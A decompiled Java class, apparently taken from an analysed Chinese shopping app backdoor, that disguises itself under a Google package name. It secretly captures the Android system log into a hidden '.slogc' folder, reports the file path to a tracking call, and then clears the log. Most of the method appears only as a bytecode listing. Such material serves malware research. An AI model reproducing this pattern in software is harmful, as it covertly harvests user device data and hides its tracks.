package com.google.android.sd.biz_dynamic_dex.logcat;

import android.content.Context;

public class SystemLogUtils {
  public static void catchLogcat(Context paramContext, int paramInt1, int paramInt2, int paramInt3) {
    // Byte code:
    //   0: invokestatic currentTimeMillis : ()J
    //   3: lstore #7
    //   5: iload_3
    //   6: i2l
    //   7: lstore #9
    //   9: iload_3
    //   10: iconst_3
    //   11: iadd
    //   12: i2l
    //   13: ldc2_w 1000
    //   16: lmul
    //   17: lstore #5
    //   19: new java/lang/StringBuilder
    //   22: dup
    //   23: invokespecial <init> : ()V
    //   26: astore #16
    //   28: new java/lang/StringBuilder
    //   31: dup
    //   32: invokespecial <init> : ()V
    //   35: astore #11
    //   37: aload #11
    //   39: invokestatic getExternalStorageDirectory : ()Ljava/io/File;
    //   42: invokevirtual getAbsolutePath : ()Ljava/lang/String;
    //   45: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   48: pop
    //   49: aload #11
    //   51: ldc '/Documents'
    //   53: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   56: pop
    //   57: new java/io/File
    //   60: dup
    //   61: aload #11
    //   63: invokevirtual toString : ()Ljava/lang/String;
    //   66: ldc '.slogc'
    //   68: invokespecial <init> : (Ljava/lang/String;Ljava/lang/String;)V
    //   71: astore #11
    //   73: aload #11
    //   75: invokevirtual exists : ()Z
    //   78: ifne -> 87
    //   81: aload #11
    //   83: invokevirtual mkdirs : ()Z
    //   86: pop
    //   87: new java/lang/StringBuilder
    //   90: dup
    //   91: invokespecial <init> : ()V
    //   94: astore #12
    //   96: aload #12
    //   98: lload #7
    //   100: invokevirtual append : (J)Ljava/lang/StringBuilder;
    //   103: pop
    //   104: aload #12
    //   106: ldc '.txt'
    //   108: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   111: pop
    //   112: new java/io/File
    //   115: dup
    //   116: aload #11
    //   118: aload #12
    //   120: invokevirtual toString : ()Ljava/lang/String;
    //   123: invokespecial <init> : (Ljava/io/File;Ljava/lang/String;)V
    //   126: astore #12
    //   128: aload #12
    //   130: invokevirtual getAbsolutePath : ()Ljava/lang/String;
    //   133: astore #17
    //   135: invokestatic getRuntime : ()Ljava/lang/Runtime;
    //   138: ldc 'logcat -v time'
    //   140: invokevirtual exec : (Ljava/lang/String;)Ljava/lang/Process;
    //   143: astore #11
    //   145: new java/io/FileOutputStream
    //   148: dup
    //   149: aload #12
    //   151: invokespecial <init> : (Ljava/io/File;)V
    //   154: astore #12
    //   156: new java/io/InputStreamReader
    //   159: dup
    //   160: aload #11
    //   162: invokevirtual getInputStream : ()Ljava/io/InputStream;
    //   165: invokespecial <init> : (Ljava/io/InputStream;)V
    //   168: astore #13
    //   170: new java/io/BufferedReader
    //   173: dup
    //   174: aload #13
    //   176: invokespecial <init> : (Ljava/io/Reader;)V
    //   179: astore #15
    //   181: ldc '---------start---------'
    //   183: invokestatic debugLog : (Ljava/lang/String;)V
    //   186: aload #11
    //   188: astore #14
    //   190: iconst_0
    //   191: istore #4
    //   193: iload_1
    //   194: istore_3
    //   195: aload #15
    //   197: invokevirtual readLine : ()Ljava/lang/String;
    //   200: astore #18
    //   202: aload #18
    //   204: ifnonnull -> 219
    //   207: invokestatic currentTimeMillis : ()J
    //   210: lload #7
    //   212: lsub
    //   213: lload #5
    //   215: lcmp
    //   216: ifge -> 320
    //   219: aload #18
    //   221: invokestatic isEmpty : (Ljava/lang/CharSequence;)Z
    //   224: ifeq -> 230
    //   227: goto -> 195
    //   230: aload #16
    //   232: ldc '\\n'
    //   234: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   237: pop
    //   238: aload #16
    //   240: aload #18
    //   242: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   245: pop
    //   246: iload #4
    //   248: iload_2
    //   249: if_icmple -> 721
    //   252: aload #12
    //   254: aload #16
    //   256: invokevirtual toString : ()Ljava/lang/String;
    //   259: invokevirtual getBytes : ()[B
    //   262: invokevirtual write : ([B)V
    //   265: aload #12
    //   267: invokevirtual flush : ()V
    //   270: new java/lang/StringBuilder
    //   273: dup
    //   274: invokespecial <init> : ()V
    //   277: astore #16
    //   279: iload_3
    //   280: ifgt -> 712
    //   283: goto -> 320
    //   286: invokestatic currentTimeMillis : ()J
    //   289: lload #7
    //   291: lsub
    //   292: lload #9
    //   294: ldc2_w 1000
    //   297: lmul
    //   298: lcmp
    //   299: ifle -> 423
    //   302: aload #12
    //   304: aload #16
    //   306: invokevirtual toString : ()Ljava/lang/String;
    //   309: invokevirtual getBytes : ()[B
    //   312: invokevirtual write : ([B)V
    //   315: aload #12
    //   317: invokevirtual flush : ()V
    //   320: ldc '---------end---------'
    //   322: invokestatic debugLog : (Ljava/lang/String;)V
    //   325: new java/util/HashMap
    //   328: dup
    //   329: iconst_2
    //   330: invokespecial <init> : (I)V
    //   333: astore #16
    //   335: aload #16
    //   337: ldc 'status'
    //   339: ldc '2'
    //   341: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   346: pop
    //   347: new java/lang/StringBuilder
    //   350: dup
    //   351: invokespecial <init> : ()V
    //   354: astore #18
    //   356: aload #18
    //   358: ldc 'filePath: '
    //   360: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   363: pop
    //   364: aload #18
    //   366: aload #17
    //   368: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   371: pop
    //   372: aload #16
    //   374: ldc 'details'
    //   376: aload #18
    //   378: invokevirtual toString : ()Ljava/lang/String;
    //   381: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   386: pop
    //   387: aload_0
    //   388: sipush #376
    //   391: aload #16
    //   393: invokestatic submitTrackAsync : (Landroid/content/Context;ILjava/util/Map;)V
    //   396: aload #12
    //   398: invokestatic closeQuietly : (Ljava/io/Closeable;)V
    //   401: aload #13
    //   403: invokestatic closeQuietly : (Ljava/io/Closeable;)V
    //   406: aload #15
    //   408: invokestatic closeQuietly : (Ljava/io/Closeable;)V
    //   411: aload #14
    //   413: ifnull -> 668
    //   416: aload #14
    //   418: astore #11
    //   420: goto -> 663
    //   423: iload_1
    //   424: istore #4
    //   426: goto -> 195
    //   429: astore_0
    //   430: goto -> 439
    //   433: astore #14
    //   435: goto -> 460
    //   438: astore_0
    //   439: aload #13
    //   441: astore #14
    //   443: aload #12
    //   445: astore #13
    //   447: aload #15
    //   449: astore #12
    //   451: aload #14
    //   453: astore #15
    //   455: goto -> 673
    //   458: astore #14
    //   460: aload #13
    //   462: astore #16
    //   464: aload #12
    //   466: astore #13
    //   468: aload #15
    //   470: astore #12
    //   472: aload #16
    //   474: astore #15
    //   476: goto -> 572
    //   479: astore_0
    //   480: aload #13
    //   482: astore #15
    //   484: aload #12
    //   486: astore #13
    //   488: aconst_null
    //   489: astore #12
    //   491: goto -> 673
    //   494: astore #14
    //   496: aload #13
    //   498: astore #15
    //   500: aload #12
    //   502: astore #13
    //   504: aconst_null
    //   505: astore #12
    //   507: goto -> 572
    //   510: astore_0
    //   511: aload #12
    //   513: astore #13
    //   515: goto -> 549
    //   518: astore #14
    //   520: aload #12
    //   522: astore #13
    //   524: goto -> 566
    //   527: astore_0
    //   528: aconst_null
    //   529: astore #13
    //   531: goto -> 549
    //   534: astore #14
    //   536: aconst_null
    //   537: astore #13
    //   539: goto -> 566
    //   542: astore_0
    //   543: aconst_null
    //   544: astore #13
    //   546: aconst_null
    //   547: astore #11
    //   549: aconst_null
    //   550: astore #12
    //   552: aconst_null
    //   553: astore #15
    //   555: goto -> 673
    //   558: astore #14
    //   560: aconst_null
    //   561: astore #13
    //   563: aconst_null
    //   564: astore #11
    //   566: aconst_null
    //   567: astore #12
    //   569: aconst_null
    //   570: astore #15
    //   572: new java/util/HashMap
    //   575: dup
    //   576: iconst_2
    //   577: invokespecial <init> : (I)V
    //   580: astore #16
    //   582: aload #16
    //   584: ldc 'status'
    //   586: ldc '3'
    //   588: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   593: pop
    //   594: new java/lang/StringBuilder
    //   597: dup
    //   598: invokespecial <init> : ()V
    //   601: astore #17
    //   603: aload #17
    //   605: ldc 'error msg: '
    //   607: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   610: pop
    //   611: aload #17
    //   613: aload #14
    //   615: invokevirtual append : (Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   618: pop
    //   619: aload #16
    //   621: ldc 'details'
    //   623: aload #17
    //   625: invokevirtual toString : ()Ljava/lang/String;
    //   628: invokeinterface put : (Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   633: pop
    //   634: aload_0
    //   635: sipush #376
    //   638: aload #16
    //   640: invokestatic submitTrackAsync : (Landroid/content/Context;ILjava/util/Map;)V
    //   643: aload #13
    //   645: invokestatic closeQuietly : (Ljava/io/Closeable;)V
    //   648: aload #15
    //   650: invokestatic closeQuietly : (Ljava/io/Closeable;)V
    //   653: aload #12
    //   655: invokestatic closeQuietly : (Ljava/io/Closeable;)V
    //   658: aload #11
    //   660: ifnull -> 668
    //   663: aload #11
    //   665: invokevirtual destroy : ()V
    //   668: invokestatic clearLogcat : ()V
    //   671: return
    //   672: astore_0
    //   673: aload #13
    //   675: invokestatic closeQuietly : (Ljava/io/Closeable;)V
    //   678: aload #15
    //   680: invokestatic closeQuietly : (Ljava/io/Closeable;)V
    //   683: aload #12
    //   685: invokestatic closeQuietly : (Ljava/io/Closeable;)V
    //   688: aload #11
    //   690: ifnull -> 698
    //   693: aload #11
    //   695: invokevirtual destroy : ()V
    //   698: invokestatic clearLogcat : ()V
    //   701: aload_0
    //   702: athrow
    //   703: astore_0
    //   704: goto -> 668
    //   707: astore #11
    //   709: goto -> 698
    //   712: iload_3
    //   713: iconst_1
    //   714: isub
    //   715: istore_3
    //   716: iconst_0
    //   717: istore_1
    //   718: goto -> 286
    //   721: iload #4
    //   723: iconst_1
    //   724: iadd
    //   725: istore_1
    //   726: goto -> 286
    // Exception table:
    //   from	to	target	type
    //   28	87	558	java/lang/Exception
    //   28	87	542	finally
    //   87	145	558	java/lang/Exception
    //   87	145	542	finally
    //   145	156	534	java/lang/Exception
    //   145	156	527	finally
    //   156	170	518	java/lang/Exception
    //   156	170	510	finally
    //   170	181	494	java/lang/Exception
    //   170	181	479	finally
    //   181	186	458	java/lang/Exception
    //   181	186	438	finally
    //   195	202	433	java/lang/Exception
    //   195	202	429	finally
    //   207	219	433	java/lang/Exception
    //   207	219	429	finally
    //   219	227	433	java/lang/Exception
    //   219	227	429	finally
    //   230	246	433	java/lang/Exception
    //   230	246	429	finally
    //   252	279	433	java/lang/Exception
    //   252	279	429	finally
    //   286	320	433	java/lang/Exception
    //   286	320	429	finally
    //   320	396	433	java/lang/Exception
    //   320	396	429	finally
    //   572	643	672	finally
    //   663	668	703	java/lang/Exception
    //   693	698	707	java/lang/Exception
  }
  
  public static void catchLogcatAsync(final Context context, final int maxPages, final int maxLinePerPage, final int maxTimeSecs) {
    (new Thread(new Runnable() {
          public void run() {
            try {
              SystemLogUtils.catchLogcat(context, maxPages, maxLinePerPage, maxTimeSecs);
              return;
            } catch (Exception exception) {
              return;
            } 
          }
        })).start();
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\218a37ea-710d-49cb-b872-2a47a1115c69-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\logcat\SystemLogUtils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */